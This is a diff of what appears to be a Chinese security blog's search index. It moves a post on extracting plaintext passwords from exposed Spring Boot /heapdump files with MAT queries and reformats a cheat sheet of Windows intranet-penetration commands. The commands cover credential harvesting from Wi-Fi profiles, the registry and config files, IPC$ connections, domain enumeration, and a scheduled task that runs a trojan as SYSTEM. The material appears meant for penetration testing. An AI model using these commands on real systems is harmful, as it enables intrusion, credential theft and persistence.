@@ -61,27 +61,6 @@ cs生成Windows exe，运行成功上线.可以看到14.17.67.46 东莞IP上线�
       </tags>
   </entry>
   <entry>
-    <title>MAT 查找 spring heapdump 中的密码明文</title>
-    <url>/2020/08/25/SpringBootHeapdump/</url>
-    <content><![CDATA[<h2 id="前景"><a href="#前景" class="headerlink" title="前景"></a>前景</h2><p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词 (如 password、secret) 的属性名对应的属性值用 <strong>**</strong> 号替换，以达到脱敏的效果。<br>在目标既不出网，/jolokia 接口又没有合适的 MBean 或者不支持 POST 请求的情况下，很多获取被星号脱敏的密码的明文的方法就失效了。<br>这时候就可以利用 Eclipse Memory Analyzer 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文。</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>1 直接下载<strong><a href="http://xx.xx.xx.xx/heapdump">http://xx.xx.xx.xx/heapdump</a></strong> 或者<strong><a href="http://xx.xx.xx.xx/actuator/heapdump">http://xx.xx.xx.xx/actuator/heapdump</a></strong> (spring2.x 修改了路径)</p>
-<p>2 这时候就可以利用 Eclipse Memory Analyzer 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文</p>
-<p>3 使用<a href="https://www.o2oxy.cn/wp-content/uploads/2020/05/MemoryAnalyzer.zip"> Eclipse Memory Analyzer</a> 直接打开下载的 heapdump 文件，点击 OQL 标签，在查询框中输入,再点击感叹号运行下列语句。前者Spring1.x 后者Spring2.x</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from org.springframework.web.context.support.StandardServletEnvironment</span><br><span class="line">或者</span><br><span class="line">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br></pre></td></tr></table></figure>
-<p>4 成功查询到密码，结合/env页面泄漏的信息可以知道是jdbc还是邮箱的密码等<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/25/15983217624960.jpg" alt="-w1187"></p>
-<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>1 select语句中的关键字password替换为其他mail关键字进行fuzz</p>
-<p>2 heapdump 泄漏的反序列化点是否可以被我们黑盒利用</p>
-<p>3 可以结合/env页面泄漏的信息猜测其他敏感内容rce，比如sso的ak和sk等</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://fanyibo2009.github.io/">欢迎查看无尾熊blog</a><br><a href="http://vulsee.com/archives/vulsee_2020/0807_11841.html">spring boot 获取被星号脱敏的密码的明文</a><br><a href="https://mp.weixin.qq.com/s/YirHAXg3VZXA3Znj4L6xSw">xray社区记一次信息泄漏到RCE</a></p>
-]]></content>
-      <categories>
-        <category>代码</category>
-      </categories>
-      <tags>
-        <tag>黑盒测试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>DOMXSS的一点研究</title>
     <url>/2021/02/22/DOMXSS/</url>
     <content><![CDATA[<h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><p>近期一起与Camaro师傅做项目，发现他对domxss有很深入的研究（前端之父），顺便学习讨论了一下，写点博客记录一下心得。Dom可以简单理解为html的节点，当前端参数可控制、并且可影响节点时候，形成domxss。<br>通常来讲domxss是属于前端的漏洞，通过前端的javascript代码获取传入的变量，形成xss漏洞。特点：不会与后端服务器进行交互。DOM XSS有何不同？我们可以观察到：HTML页面是静态的，并且与其他类型的XSS攻击一样，页面源代码中没有嵌入任何恶意脚本。如果使用＃字符，脚本代码将永远不会到达服务器。它被视为一个片段，浏览器不会转发它。因此，服务器端攻击检测工具将无法检测到此攻击。这里抛出一个疑问：如果一段domxss的payload可以保存在前端，并且储存到数据库中。比如在留言的地方插入domxss-payload，那么当我们点击这个留言的时候触发domxss，我们是否可以称它为存储型domxss呢？是不是颠覆了大家对xss的分类和认知了？–通常domxss被称为“javascript中输出数据到HTML页面”，domxss的分类在我眼里一直是一个谜。</p>
@@ -118,6 +97,27 @@ document.write(eval(name))  </code></pre><p>从浏览器获取name的值，然�
       </categories>
       <tags>
         <tag>xss</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MAT 查找 spring heapdump 中的密码明文</title>
+    <url>/2020/08/25/SpringBootHeapdump/</url>
+    <content><![CDATA[<h2 id="前景"><a href="#前景" class="headerlink" title="前景"></a>前景</h2><p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词 (如 password、secret) 的属性名对应的属性值用 <strong>**</strong> 号替换，以达到脱敏的效果。<br>在目标既不出网，/jolokia 接口又没有合适的 MBean 或者不支持 POST 请求的情况下，很多获取被星号脱敏的密码的明文的方法就失效了。<br>这时候就可以利用 Eclipse Memory Analyzer 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文。</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>1 直接下载<strong><a href="http://xx.xx.xx.xx/heapdump">http://xx.xx.xx.xx/heapdump</a></strong> 或者<strong><a href="http://xx.xx.xx.xx/actuator/heapdump">http://xx.xx.xx.xx/actuator/heapdump</a></strong> (spring2.x 修改了路径)</p>
+<p>2 这时候就可以利用 Eclipse Memory Analyzer 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文</p>
+<p>3 使用<a href="https://www.o2oxy.cn/wp-content/uploads/2020/05/MemoryAnalyzer.zip"> Eclipse Memory Analyzer</a> 直接打开下载的 heapdump 文件，点击 OQL 标签，在查询框中输入,再点击感叹号运行下列语句。前者Spring1.x 后者Spring2.x</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from org.springframework.web.context.support.StandardServletEnvironment</span><br><span class="line">或者</span><br><span class="line">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br></pre></td></tr></table></figure>
+<p>4 成功查询到密码，结合/env页面泄漏的信息可以知道是jdbc还是邮箱的密码等<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/25/15983217624960.jpg" alt="-w1187"></p>
+<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>1 select语句中的关键字password替换为其他mail关键字进行fuzz</p>
+<p>2 heapdump 泄漏的反序列化点是否可以被我们黑盒利用</p>
+<p>3 可以结合/env页面泄漏的信息猜测其他敏感内容rce，比如sso的ak和sk等</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://fanyibo2009.github.io/">欢迎查看无尾熊blog</a><br><a href="http://vulsee.com/archives/vulsee_2020/0807_11841.html">spring boot 获取被星号脱敏的密码的明文</a><br><a href="https://mp.weixin.qq.com/s/YirHAXg3VZXA3Znj4L6xSw">xray社区记一次信息泄漏到RCE</a></p>
+]]></content>
+      <categories>
+        <category>代码</category>
+      </categories>
+      <tags>
+        <tag>黑盒测试</tag>
       </tags>
   </entry>
   <entry>
@@ -385,8 +385,7 @@ web.xml
   <entry>
     <title>内网渗透常用命令</title>
     <url>/2021/10/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<p><strong>1.域常用操作命令</strong></p>
-<table>
+    <content><![CDATA[<table>
 <thead>
 <tr>
 <th align="left"><strong>1.域常用操作命令</strong></th>
@@ -534,23 +533,23 @@ web.xml
 <td>查看登陆到这台服务器的计算机名</td>
 </tr>
 <tr>
-<td align="left">net time \192.168.1.1</td>
+<td align="left">net time \\192.168.1.1</td>
 <td>查询远程共享主机192.168.1.1的时间</td>
 </tr>
 <tr>
-<td align="left">net use \IP\ipc$ password /user:username@domain</td>
+<td align="left">net use \\IP\ipc$ password /user:username@domain</td>
 <td>ipc$域内连接</td>
 </tr>
 <tr>
-<td align="left">net view \dc2.0day.org</td>
+<td align="left">net view \\dc2.0day.org</td>
 <td>查看域控共享情况</td>
 </tr>
 <tr>
-<td align="left">dir \dc2.0day.org /s /a &gt; sysvol.txt</td>
+<td align="left">dir \\dc2.0day.org /s /a &gt; sysvol.txt</td>
 <td>列出sysvol日志记录</td>
 </tr>
 <tr>
-<td align="left">xcopy \dc2.0day.org\sysvol.txt sysvol.txt /i /e /c</td>
+<td align="left">xcopy \\dc2.0day.org\sysvol.txt sysvol.txt /i /e /c</td>
 <td>远程拷贝到本地sysvol日志</td>
 </tr>
 <tr>
@@ -585,195 +584,195 @@ web.xml
 <table>
 <thead>
 <tr>
-<th><strong>2.基本内网渗透命令：</strong></th>
+<th align="left"><strong>2.基本内网渗透命令：</strong></th>
 <th></th>
 </tr>
 </thead>
 <tbody><tr>
-<td>ipconfig/all</td>
-<td>//查看IP地址</td>
+<td align="left">ipconfig /all</td>
+<td>查看IP地址</td>
 </tr>
 <tr>
-<td>ipconfig /release</td>
-<td>//释放地址</td>
+<td align="left">ipconfig /release</td>
+<td>释放地址</td>
 </tr>
 <tr>
-<td>ipconfig /renew</td>
+<td align="left">ipconfig /renew</td>
 <td>重新获取Ip地址</td>
 </tr>
 <tr>
-<td>whoami</td>
-<td>//查询账号所属权限</td>
+<td align="left">whoami</td>
+<td>查询账号所属权限</td>
 </tr>
 <tr>
-<td>whoami/all</td>
-<td>//查看sid值</td>
+<td align="left">whoami /all</td>
+<td>查看sid值</td>
 </tr>
 <tr>
-<td>systeminfo</td>
-<td>//查询系统以及补丁信息</td>
+<td align="left">systeminfo</td>
+<td>查询系统以及补丁信息</td>
 </tr>
 <tr>
-<td>tasklist /svc</td>
-<td>//查看进程</td>
+<td align="left">tasklist /svc</td>
+<td>查看进程</td>
 </tr>
 <tr>
-<td>taskkill /im 进程名称(cmd)</td>
-<td>//结束进程</td>
+<td align="left">taskkill /im 进程名称(cmd)</td>
+<td>结束进程</td>
 </tr>
 <tr>
-<td>taskkill /pid[进程码] -t(结束该进程) -f(强制结束该进程以及所有子进程)</td>
-<td></td>
+<td align="left">taskkill /pid</td>
+<td>[进程码] -t(结束该进程) -f(强制结束该进程以及所有子进程)</td>
 </tr>
 <tr>
-<td>wmic qfe get hotfixid</td>
-<td>//查看已安装过得补丁，这个很实用</td>
+<td align="left">wmic qfe get hotfixid</td>
+<td>查看已安装过得补丁，这个很实用</td>
 </tr>
 <tr>
-<td>wmic qfe list full /format:htable &gt; hotfixes.htm</td>
-<td>//详细的补丁安装</td>
+<td align="left">wmic qfe list full /format:htable &gt; hotfixes.htm</td>
+<td>详细的补丁安装</td>
 </tr>
 <tr>
-<td>wmic qfe</td>
-<td>//查询补丁信息以及微软提供的下载地址</td>
+<td align="left">wmic qfe</td>
+<td>查询补丁信息以及微软提供的下载地址</td>
 </tr>
 <tr>
-<td>ping hostname(主机名）</td>
-<td>//显示该机器名的IP</td>
+<td align="left">ping hostname(主机名）</td>
+<td>显示该机器名的IP</td>
 </tr>
 <tr>
-<td>ping -a 192.168.1.1</td>
-<td>返回ip主机名称</td>
+<td align="left">net start</td>
+<td>查看当前运行的服务</td>
 </tr>
 <tr>
-<td>net start</td>
-<td>//查看当前运行的服务</td>
+<td align="left">net user</td>
+<td>查看本地组的用户</td>
 </tr>
 <tr>
-<td>net user</td>
-<td>//查看本地组的用户</td>
+<td align="left">net localhroup administrators</td>
+<td>查看本机管理员组有哪些用户</td>
 </tr>
 <tr>
-<td>net localhroup administrators</td>
-<td>//查看本机管理员组有哪些用户</td>
+<td align="left">net user</td>
+<td>查看会话</td>
 </tr>
 <tr>
-<td>net user</td>
-<td>//查看会话</td>
+<td align="left">net session</td>
+<td>查看当前会话</td>
 </tr>
 <tr>
-<td>net session</td>
-<td>//查看当前会话</td>
+<td align="left">net share</td>
+<td>查看SMB指向的路径[即共享]</td>
 </tr>
 <tr>
-<td>net share</td>
-<td>//查看SMB指向的路径[即共享]</td>
+<td align="left">wmic share get name,path</td>
+<td>查看SMB指向的路径</td>
 </tr>
 <tr>
-<td>wmic share get name,path</td>
-<td>//查看SMB指向的路径</td>
+<td align="left">wmic nteventlog get path,filename,writeable</td>
+<td>查询系统日志文件存储位置</td>
 </tr>
 <tr>
-<td>wmic nteventlog get path,filename,writeable</td>
-<td>//查询系统日志文件存储位置</td>
+<td align="left">net use \\IP\ipc$ password /user:username</td>
+<td>建立IPC会话（工作组模式）</td>
 </tr>
 <tr>
-<td>net use \IP\ipc$ password /user:username</td>
-<td>//建立IPC会话（工作组模式）</td>
+<td align="left">net use z: \\192.168.1.1</td>
+<td>建立映射到本机Z盘</td>
 </tr>
 <tr>
-<td>net use z: \192.168.1.1</td>
-<td>//建立映射到本机Z盘</td>
+<td align="left">net time \\172.16.16.2</td>
+<td>查询共享主机的是</td>
 </tr>
 <tr>
-<td>net time \172.16.16.2</td>
-<td>//查询共享主机的是</td>
+<td align="left">at \\172.16.16.2 13:50 c:\windows\2009.exe</td>
+<td>在共享主机上执行</td>
 </tr>
 <tr>
-<td>at \172.16.16.2 13:50 c:\windows\2009.exe</td>
-<td>//在共享主机上执行</td>
+<td align="left">netstat -ano</td>
+<td>查看开放的端口</td>
 </tr>
 <tr>
-<td>netstat -ano</td>
-<td>//查看开放的端口</td>
+<td align="left">netstat -an | find “3389”</td>
+<td>找到3389端口</td>
 </tr>
 <tr>
-<td>netstat -an | find “3389”</td>
-<td>//找到3389端口</td>
+<td align="left">net accounts</td>
+<td>查看本地密码策略</td>
 </tr>
 <tr>
-<td>net accounts</td>
-<td>//查看本地密码策略</td>
+<td align="left">nbtstat –A ip</td>
+<td>netbiso查询</td>
 </tr>
 <tr>
-<td>nbtstat –A ip</td>
-<td>//netbiso查询，获取主机名</td>
+<td align="left">net view</td>
+<td>查看机器注释或许能得到当前活动状态的机器列表，如果禁用netbios就查看不出来</td>
 </tr>
 <tr>
-<td>net view</td>
-<td>//查看机器注释或许能得到当前活动状态的机器列表，如果禁用netbios就查看不出来</td>
+<td align="left">echo %PROCESSOR_ARCHITECTURE%</td>
+<td>查看系统是32还是64位</td>
 </tr>
 <tr>
-<td>echo %PROCESSOR_ARCHITECTURE%</td>
-<td>//查看系统是32还是64位</td>
+<td align="left">set</td>
+<td>查看系统环境设置变量</td>
 </tr>
 <tr>
-<td>set</td>
-<td>//查看系统环境设置变量</td>
+<td align="left">net start</td>
+<td>查看当前运行的服务</td>
 </tr>
 <tr>
-<td>net start</td>
-<td>//查看当前运行的服务</td>
+<td align="left">wmic service list brief</td>
+<td>查看进程服务</td>
 </tr>
 <tr>
-<td>wmic service list brief</td>
-<td>//查看进程服务</td>
+<td align="left">wmic process list brief</td>
+<td>查看进程</td>
 </tr>
 <tr>
-<td>wmic process list brief</td>
-<td>//查看进程</td>
+<td align="left">wmic startup list brief</td>
+<td>查看启动程序信息</td>
 </tr>
 <tr>
-<td>wmic startup list brief</td>
-<td>//查看启动程序信息</td>
+<td align="left">wmic product list brief</td>
+<td>查看安装程序和版本信息（漏洞利用线索）</td>
 </tr>
 <tr>
-<td>wmic product list brief</td>
-<td>//查看安装程序和版本信息（漏洞利用线索）</td>
+<td align="left">wmic startup list full</td>
+<td>识别开机启动的程序</td>
 </tr>
 <tr>
-<td>wmic startup list full</td>
-<td>//识别开机启动的程序</td>
+<td align="left">wmic process where(description=”mysqld.exe”)&gt;&gt;mysql.log</td>
+<td>获取软件安装路径</td>
 </tr>
 <tr>
-<td>wmic process where(description=”mysqld.exe”)&gt;&gt;mysql.log</td>
-<td>//获取软件安装路径</td>
+<td align="left">for /f “skip=9 tokens=1,2 delims=:” %i in (‘netsh wlan showprofiles’) do @echo %j | findstr-i -v echo | netsh wlan show profiles %jkey=clear</td>
+<td>一键获取wifi密码</td>
 </tr>
 <tr>
-<td>for /f “skip=9 tokens=1,2 delims=:” %i in (‘netsh wlan showprofiles’) do @echo %j | findstr-i -v echo | netsh wlan show profiles %jkey=clear</td>
-<td>//一键获取wifi密码</td>
+<td align="left">if defined PSModulePath (echo 支持powershell) else (echo 不支持powershell)</td>
+<td>查看是否支持posershell</td>
 </tr>
 <tr>
-<td>if defined PSModulePath (echo 支持powershell) else (echo 不支持powershell)</td>
-<td>//查看是否支持posershell</td>
+<td align="left">qwinsta</td>
+<td>查看登录情况</td>
 </tr>
 <tr>
-<td>qwinsta</td>
-<td>//查看登录情况</td>
+<td align="left">schtasks.exe /Create /RU”SYSTEM” /SC MINUTE /MO 45 /TN FIREWALL /TR “c:/muma.ex  e” /ED 2017/4/7</td>
+<td>添加计划任务</td>
 </tr>
 <tr>
-<td>schtasks.exe /Create /RU”SYSTEM” /SC MINUTE /MO 45 /TN FIREWALL /TR “c:/muma.ex  e” /ED 2017/4/7</td>
-<td>//添加计划任务</td>
-</tr>
-<tr>
-<td>set KB2829361=MS13-046&amp;set KB2830290=MS13-046&amp;setKB2667440=MS12-020&amp;set KB2667402=MS12-020&amp;set KB3124280=MS16-016&amp;setKB3077657=MS15-077&amp;set KB3045171=MS15-051&amp;setKB2592799=MS11-080&amp;set KB952004=MS09-012 PR&amp;set KB956572=MS09-012 巴西烤肉&amp;set KB970483=MS09-020 iis6&amp;set KB2124261=MS10-065 ii7&amp;setKB2271195=MS10-065 ii7&amp;systeminfo&gt;a.txt&amp;(for %i in (KB952004 KB956572KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165KB958644 KB2667402 KB2667440 KB2830290 KB2829361 KB3045171 KB3077657 KB3124280)do @type a.txt|@find /i “%i”||@echo %%i% Not Installed!)&amp;del /f/q /a a.txt</td>
-<td>//windows未打补丁情况</td>
-</tr>
-<tr>
-<td>REG query HKCU /v “pwd” /s</td>
-<td>//获取保存到注册表中的密码</td>
+<td align="left">REG query HKCU /v “pwd” /s</td>
+<td>获取保存到注册表中的密码</td>
 </tr>
 </tbody></table>
+<table>
+<thead>
+<tr>
+<th>set KB2829361=MS13-046&amp;set KB2830290=MS13-046&amp;setKB2667440=MS12-020&amp;set KB2667402=MS12-020&amp;set KB3124280=MS16-016&amp;setKB3077657=MS15-077&amp;set KB3045171=MS15-051&amp;setKB2592799=MS11-080&amp;set KB952004=MS09-012 PR&amp;set KB956572=MS09-012 巴西烤肉&amp;set KB970483=MS09-020 iis6&amp;set KB2124261=MS10-065 ii7&amp;setKB2271195=MS10-065 ii7&amp;systeminfo&gt;a.txt&amp;(for %i in (KB952004 KB956572KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165KB958644 KB2667402 KB2667440 KB2830290 KB2829361 KB3045171 KB3077657 KB3124280)do @type a.txt|@find /i “%i”||@echo %%i% Not Installed!)&amp;del /f/q /a a.txt</th>
+<th>windows未打补丁情况</th>
+</tr>
+</thead>
+</table>
 <table>
 <thead>
 <tr>
@@ -783,39 +782,39 @@ web.xml
 </thead>
 <tbody><tr>
 <td>tracert IP</td>
-<td>//路由跟踪</td>
+<td>路由跟踪</td>
 </tr>
 <tr>
 <td>route print</td>
-<td>//打印路由表</td>
+<td>打印路由表</td>
 </tr>
 <tr>
 <td>arp -a</td>
-<td>//列出本网段内所有活跃的IP地址</td>
+<td>列出本网段内所有活跃的IP地址</td>
 </tr>
 <tr>
 <td>arp -s （ip + mac）</td>
-<td>//绑定mac与ip地址</td>
+<td>绑定mac与ip地址</td>
 </tr>
 <tr>
 <td>arp -d （ip + mac）</td>
-<td>//解绑mac与ip地址</td>
+<td>解绑mac与ip地址</td>
 </tr>
 <tr>
 <td>nbtscan -r 192.168.16.0/24</td>
-<td>//通过小工具nbtscan扫描整个网络</td>
+<td>通过小工具nbtscan扫描整个网络</td>
 </tr>
 <tr>
 <td>netsh firewall show config</td>
-<td>//查看防火墙策略</td>
+<td>查看防火墙策略</td>
 </tr>
 <tr>
 <td>netsh firewall show state</td>
-<td>//查看防火墙策略</td>
+<td>查看防火墙策略</td>
 </tr>
 <tr>
 <td>for /l %i in (1,1,255) do @ping 10.0.0.%i -w 1 -n 1 | find /i”ttl”</td>
-<td>//批量扫描内网存活主机</td>
+<td>批量扫描内网存活主机</td>
 </tr>
 </tbody></table>
 <table>
@@ -863,15 +862,15 @@ web.xml
 </thead>
 <tbody><tr>
 <td>dir /b/s config.*</td>
-<td>//查看所在目录所有config.为前缀的文件</td>
+<td>查看所在目录所有config.为前缀的文件</td>
 </tr>
 <tr>
 <td>findstr /si password *.xml *.ini *.txt</td>
-<td>//查看后缀名文件中含有password关键字的文件</td>
+<td>查看后缀名文件中含有password关键字的文件</td>
 </tr>
 <tr>
 <td>findstr /si login *.xml *.ini *.txt</td>
-<td>//查看后缀名文件中含有login关键字的文件</td>
+<td>查看后缀名文件中含有login关键字的文件</td>
 </tr>
 <tr>
 <td>copy con 创建命令：</td>
@@ -879,11 +878,11 @@ web.xml
 </tr>
 <tr>
 <td>copy con ftp.bat</td>
-<td>//创建ftp.bat批处理，然后输入ifconfig等命令，按ctr+z退出，并创建成功</td>
+<td>创建ftp.bat批处理，然后输入ifconfig等命令，按ctr+z退出，并创建成功</td>
 </tr>
 <tr>
 <td>copy con test.vbs</td>
-<td>//创建test.vbs脚本，输入脚本后，按ctr+z退出，并创建成功</td>
+<td>创建test.vbs脚本，输入脚本后，按ctr+z退出，并创建成功</td>
 </tr>
 </tbody></table>
 <table>
@@ -895,59 +894,59 @@ web.xml
 </thead>
 <tbody><tr>
 <td>dsquery user domainroot -limit 65535 &amp;&amp; net user /domain</td>
-<td>//列出该域内所有用户名</td>
+<td>列出该域内所有用户名</td>
 </tr>
 <tr>
 <td>dsquery server -domain super.com | dsget server -dnsname -site</td>
-<td>//搜索域内所有域控制器并显示他们的DNS主机名和站点名称</td>
+<td>搜索域内所有域控制器并显示他们的DNS主机名和站点名称</td>
 </tr>
 <tr>
 <td>dsquery contact</td>
-<td>//寻找目录中的联系人</td>
+<td>寻找目录中的联系人</td>
 </tr>
 <tr>
 <td>dsquery subnet</td>
-<td>//列出该域内网段划分</td>
+<td>列出该域内网段划分</td>
 </tr>
 <tr>
 <td>query user</td>
-<td>//查询那些用户在线</td>
+<td>查询那些用户在线</td>
 </tr>
 <tr>
 <td>dsquery group &amp;&amp; net group /domain</td>
-<td>//列出该域内分组</td>
+<td>列出该域内分组</td>
 </tr>
 <tr>
 <td>dsquery ou</td>
-<td>//列出该域内组织单位</td>
+<td>列出该域内组织单位</td>
 </tr>
 <tr>
 <td>dsquery server &amp;&amp; net time /domain</td>
-<td>//列出该域内域控制器</td>
+<td>列出该域内域控制器</td>
 </tr>
 <tr>
 <td>dsquery site -o rdn</td>
-<td>//搜索域中所有站点的名称</td>
+<td>搜索域中所有站点的名称</td>
 </tr>
 <tr>
 <td>dsquery group dc=super,dc=com |more</td>
-<td>//搜索在DC=SUPER,DC=COM 域中的所有组</td>
+<td>搜索在DC=SUPER,DC=COM 域中的所有组</td>
 </tr>
 <tr>
 <td>psloggedon.exe</td>
-<td>//查询那台主机和用户登录到该主机上</td>
+<td>查询那台主机和用户登录到该主机上</td>
 </tr>
 <tr>
 <td>netsess.exe  //192.168.1.115</td>
-<td>//远程主机上无需管理员权限,查询到主机名和用户</td>
+<td>远程主机上无需管理员权限,查询到主机名和用户</td>
 </tr>
 <tr>
 <td>reg query “HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\TERMINAL SERVERCLIENT\DEFAULT”</td>
-<td>//获取最近mstsc登录的记录</td>
+<td>获取最近mstsc登录的记录</td>
 </tr>
 </tbody></table>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/network/243640.html">https://www.freebuf.com/articles/network/243640.html</a></p>
-<p>内网渗透命令大全 挑战自我博客 <a href="http://www.tiaozhanziwo.com/intranet_penetration/756-2.html">http://www.tiaozhanziwo.com/intranet_penetration/756-2.html</a></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/network/243640.html">内网渗透测试：内网信息收集与上传下载</a></p>
+<p><a href="http://www.tiaozhanziwo.com/intranet_penetration/756-2.html">内网渗透命令大全挑战自我博客</a></p>
 ]]></content>
       <categories>
         <category>内网</category>
